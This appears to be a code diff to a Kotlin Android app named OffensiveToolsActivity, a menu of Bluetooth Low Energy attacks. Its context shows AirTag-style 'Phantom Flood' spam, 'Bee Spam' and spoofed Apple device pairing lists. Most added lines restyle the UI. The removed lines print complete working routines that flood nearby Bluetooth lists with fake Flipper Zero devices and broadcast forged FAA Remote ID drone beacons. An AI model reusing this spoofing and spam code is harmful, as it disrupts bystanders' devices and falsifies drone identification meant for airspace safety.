@@ -20,6 +20,8 @@ import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
+import android.graphics.Paint
+import android.text.TextPaint
 
 class OffensiveToolsActivity : Activity() {
 
@@ -31,6 +33,7 @@ class OffensiveToolsActivity : Activity() {
     private var packetCount = 0
     private var currentCallback: AdvertiseCallback? = null
     private var activeAttackName: String? = null
+    private var stopBtnRef: Button? = null
 
     // Apple Continuity ProximityPair device models (2 bytes each)
     private val appleDeviceModels = listOf(
@@ -182,7 +185,6 @@ class OffensiveToolsActivity : Activity() {
 
         statusText = TextView(this).apply {
             text = "IDLE"
-            textSize = 13f
             typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
             setTextColor(0xFF44FF44.toInt())
             gravity = Gravity.CENTER
@@ -244,17 +246,6 @@ class OffensiveToolsActivity : Activity() {
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
             confirmAndRun("Bee Spam") { startBeeSpam() }
         }
-        content.addView(buildAttackButton("FLIPPER SPAM", "Populate Bluetooth lists with spoofed Flipper Zero devices", tc))
-        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
-            confirmAndRun("Flipper Spam") { startFlipperSpam() }
-        }
-
-        // Section: RF / Drone
-        content.addView(buildSectionLabel("RF / DRONE", tc))
-        content.addView(buildAttackButton("DRONE SPOOFER", "Fake drone Remote ID beacons via BLE", tc))
-        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
-            confirmAndRun("Drone Spoofer") { startDroneSpoofer() }
-        }
 
         scroll.addView(content)
 
@@ -266,16 +257,22 @@ class OffensiveToolsActivity : Activity() {
 
         val stopBtn = Button(this).apply {
             text = "STOP ATTACK"
+
+// outline for visibility on light themes
+post {
+    paint.style = Paint.Style.FILL_AND_STROKE
+    paint.strokeWidth = 1.2f
+    setShadowLayer(1.2f, 0f, 0f, 0xFF000000.toInt())
+}
             isAllCaps = true
-            textSize = 13f
             typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
             setTextColor(0xFFFFF1E0.toInt())
             background = GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
-                intArrayOf(0xFFCC0000.toInt(), 0xFF660000.toInt())
+                intArrayOf(adjustBrightness(tc, 1.10f), adjustBrightness(tc, 0.55f))
             ).apply {
                 cornerRadius = dp(14).toFloat()
-                setStroke(dp(1), 0xFFFF4444.toInt())
+                setStroke(dp(1), tc)
             }
             setPadding(dp(10), dp(14), dp(10), dp(14))
             val lp = LinearLayout.LayoutParams(
@@ -285,8 +282,10 @@ class OffensiveToolsActivity : Activity() {
             lp.setMargins(0, 0, 0, dp(6))
             layoutParams = lp
         }
+        stopBtnRef = stopBtn
         stopBtn.setOnClickListener { stopAttack() }
         bottomContainer.addView(stopBtn)
+        updateStopButtonState()
 
         val backBtn = buildThemedButton("BACK", tc)
         backBtn.setOnClickListener { finish() }
@@ -308,6 +307,21 @@ class OffensiveToolsActivity : Activity() {
         setContentView(root)
     }
 
+    private fun adjustBrightness(color: Int, factor: Float): Int {
+        val a = (color ushr 24) and 0xFF
+        val r = (((color ushr 16) and 0xFF) * factor).toInt().coerceIn(0, 255)
+        val g = (((color ushr 8) and 0xFF) * factor).toInt().coerceIn(0, 255)
+        val b = ((color and 0xFF) * factor).toInt().coerceIn(0, 255)
+        return (a shl 24) or (r shl 16) or (g shl 8) or b
+    }
+
+    private fun updateStopButtonState() {
+        stopBtnRef?.apply {
+            alpha = if (isAttacking) 1.0f else 0.4f
+            isEnabled = isAttacking
+        }
+    }
+
     private fun confirmAndRun(name: String, action: () -> Unit) {
         if (isAttacking) { stopAttack(); return }
         if (advertiser == null) {
@@ -326,6 +340,7 @@ class OffensiveToolsActivity : Activity() {
             .setPositiveButton("Launch") { _, _ ->
                 packetCount = 0
                 isAttacking = true
+                updateStopButtonState()
                 activeAttackName = name
                 // Lock orientation so rotation doesn't kill the attack
                 requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LOCKED
@@ -632,125 +647,7 @@ class OffensiveToolsActivity : Activity() {
         handler.post(runnable)
     }
 
-    // ─── FLIPPER SPAM ───
-    private fun startFlipperSpam() {
-        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
-            statusText?.text = "NEED BLUETOOTH_CONNECT"
-            statusText?.setTextColor(0xFFFF4444.toInt())
-            isAttacking = false
-            return
-        }
 
-        val runnable = object : Runnable {
-            override fun run() {
-                if (!isAttacking) return
-
-                val name = flipperNames.random()
-                try {
-                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
-                    adapter?.setName(name.take(20))
-                } catch (_: SecurityException) {}
-
-                handler.postDelayed({
-                    if (!isAttacking) return@postDelayed
-
-                    try {
-                        currentCallback?.let { advertiser?.stopAdvertising(it) }
-                    } catch (_: SecurityException) {}
-
-                    // HID service + name-in-scan-response is the classic Flipper
-                    // BLE spoof pattern. Android auto-compresses the 16-bit 0x1812
-                    // form so the scan response still has room for the full name.
-                    val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")
-
-                    val adData = android.bluetooth.le.AdvertiseData.Builder()
-                        .setIncludeDeviceName(false)
-                        .setIncludeTxPowerLevel(false)
-                        .addServiceUuid(hidServiceUuid)
-                        .build()
-
-                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
-                        .setIncludeDeviceName(true)
-                        .setIncludeTxPowerLevel(false)
-                        .build()
-
-                    currentCallback = object : AdvertiseCallback() {
-                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
-                            runOnUiThread {
-                                packetCount++
-                                packetsText?.text = "Flippers: $packetCount | $name"
-                            }
-                        }
-                        override fun onStartFailure(errorCode: Int) {
-                            runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
-                        }
-                    }
-
-                    val settings = AdvertiseSettings.Builder()
-                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
-                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
-                        .setConnectable(true)
-                        .setTimeout(0)
-                        .build()
-
-                    try {
-                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
-                    } catch (_: SecurityException) {
-                        statusText?.text = "PERMISSION DENIED"
-                        isAttacking = false
-                    }
-                }, 500)
-
-                handler.postDelayed(this, 1200)
-            }
-        }
-        handler.post(runnable)
-    }
-
-    // ─── DRONE SPOOFER ───
-    // Uses standard BLE advertising (not promiscuous mode). No root needed.
-    // Real FAA Remote ID drones broadcast over BLE 4 Legacy Advertising.
-    // ASTM F3411 uses service UUID 0xFFFA. Keep service data under 20 bytes
-    // to fit within Android's 31-byte BLE ad limit.
-    private fun startDroneSpoofer() {
-        val runnable = object : Runnable {
-            override fun run() {
-                if (!isAttacking) return
-
-                val rand = java.util.Random()
-                val droneType = droneTypes.random()
-
-                // Compact Remote ID: msg type + ID type + 10-byte serial
-                // Total: 12 bytes service data (fits within BLE ad limits)
-                val remoteIdData = ByteArray(12)
-                remoteIdData[0] = 0x00  // Message type 0 = Basic ID
-                remoteIdData[1] = 0x01  // ID type 1 = Serial Number
-
-                // Short random serial (10 chars ASCII)
-                val serial = "SP${rand.nextInt(9999)}${rand.nextInt(9999)}"
-                val serialBytes = serial.toByteArray(Charsets.US_ASCII)
-                System.arraycopy(serialBytes, 0, remoteIdData, 2, minOf(serialBytes.size, 10))
-
-                val remoteIdUuid = android.os.ParcelUuid.fromString("0000FFFA-0000-1000-8000-00805F9B34FB")
-
-                val data = android.bluetooth.le.AdvertiseData.Builder()
-                    .setIncludeDeviceName(false)
-                    .setIncludeTxPowerLevel(false)
-                    .addServiceData(remoteIdUuid, remoteIdData)
-                    .build()
-
-                safeAdvertise(data)
-
-                runOnUiThread {
-                    packetsText?.text = "Drone: $packetCount | $droneType"
-                }
-
-                handler.postDelayed(this, 800)
-            }
-        }
-        handler.post(runnable)
-    }
 
     // ─── PHANTOM FLOOD (AirTag Spam) ───
     // Alternates between two AirTag-style Find My variants per tick so
@@ -800,6 +697,7 @@ class OffensiveToolsActivity : Activity() {
 
     private fun stopAttack() {
         isAttacking = false
+        updateStopButtonState()
         activeAttackName = null
         handler.removeCallbacksAndMessages(null)
         try {
@@ -860,7 +758,6 @@ class OffensiveToolsActivity : Activity() {
         }
         container.addView(TextView(this).apply {
             text = label
-            textSize = 13f
             typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
             setTextColor(0xFFF0E6D6.toInt())
         })
@@ -877,8 +774,7 @@ class OffensiveToolsActivity : Activity() {
     private fun buildThemedButton(label: String, tc: Int) = Button(this).apply {
         text = label
         isAllCaps = true
-        textSize = 12f
-        typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
+                typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
         setTextColor(0xFFF0E6D6.toInt())
         background = GradientDrawable(
             GradientDrawable.Orientation.TOP_BOTTOM,
